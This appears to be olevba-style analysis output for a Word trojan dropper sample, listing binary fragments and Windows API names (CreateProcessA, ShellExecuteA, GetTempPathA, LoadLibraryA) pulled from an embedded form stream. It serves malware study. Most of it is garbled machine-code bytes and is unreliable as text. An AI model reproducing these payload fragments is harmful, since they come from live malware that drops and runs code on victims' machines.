- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Ћ5d
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SSS�E�P�d0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Ѕ�u��~
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��tB������t9�e�����t
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r���������t
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Y������uj
���������u��q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U��� S�p����_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����l0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����P�k���Y�E�P��0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�SSh�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SS����Ѕ�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SSS�E�P�X0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����СT0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j
�����8
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U��QQ�E�P�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E��M�j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*h���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��!Nb�QP�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������SV�D$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3���؋D$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����A�ȋ\$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u�����d$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ȋD$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N3ҋ�^[�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U���$�E�P��0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3���3�@���5�0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%�0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V�t$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5�0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��^�V�t$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5�0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��^�U��V�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3��6G�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3��(�v
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��_^]�U��V�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�W�v
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3��*�F
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�G�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��_^]�SV�t$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2��L��A|
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ʀ�A�6��a|
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ʀ�G�%��0|
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e��et@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��F�À�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r���v
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y+���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����L$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

BNu�_^[�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���V�t$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�D�����YY|
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
uߋ�_^Ã����U��QQS3�9]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�2���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���G��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�3�:]�v
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I������?
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�)E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�_^�E�[��U��Q�e�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U�RP�Q|f�}�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u���U���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N���;�Y�F
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��uB�E�Ph�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u/�E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�E�P�]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Y�F
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^[��V�t$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������Yt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U��Q�e�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U�RP�QH�E���t
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���E��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^���t$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j��t$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3�PP�t$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j��t$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U���0VW�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6P���������Yu
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"VW�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W������E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2��|SW�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W���������Yu
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2��X�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_�U�R�U�RR�U�RSf�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�}�f�}��E�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�Q,��St
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V����Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[_^��U��QV�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V������Yt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U�RP�Q$��t
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�^�áh
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���H%
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ShellExecuteA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SHELL32.dll
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lstrcmpiA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GetModuleFileNameA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CreateProcessA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GetStartupInfoA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sleep
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
LoadLibraryA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lstrcatA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GetTempPathA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CreateMutexA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CreateThread
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GetCommandLineA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FreeLibrary
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GetCurrentProcessId
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GetProcAddress
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
